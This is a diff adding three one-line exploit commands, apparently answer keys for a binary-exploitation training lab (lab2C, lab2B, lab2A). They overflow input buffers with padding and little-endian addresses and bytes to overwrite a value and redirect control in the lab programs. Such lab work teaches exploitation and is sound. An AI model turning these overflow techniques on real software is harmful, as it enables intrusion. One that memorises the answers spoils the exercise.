@@ -1,0 +1,4 @@
+lab2C: ./lab2C AAAAAAAAAAAAAAA$(printf '\xef\xbe\xad\xde')
+lab2B: ./lab2B AAAAAAAAAAAAAAAAAAAAAAAAAAA$(printf '\xc9\x86\x04\x08')$(printf '\xd0\x87\x04\x08') 
+lab2A: python -c "import sys;printf = sys.stdout.write;printf('A'*12 + '\n');printf('B\n'*23);printf('\xfd\n\x86\n\x04\n\x08\n');printf('C'*12 + '\x00\x00\x09\n');" > /tmp/tmp.txt; cat /tmp/tmp.txt - | ./lab2A
+
